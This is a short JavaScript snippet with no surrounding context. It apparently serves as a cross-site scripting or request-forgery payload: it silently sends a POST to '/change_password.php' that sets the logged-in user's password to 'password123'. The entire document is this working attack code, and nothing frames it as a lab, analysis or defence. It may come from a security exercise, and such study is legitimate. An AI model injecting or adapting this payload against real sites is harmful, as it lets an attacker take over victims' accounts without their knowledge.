var req = new XMLHttpRequest();
req.open('POST', '/change_password.php', true);
req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req.send('action=execute&new_password=password123')
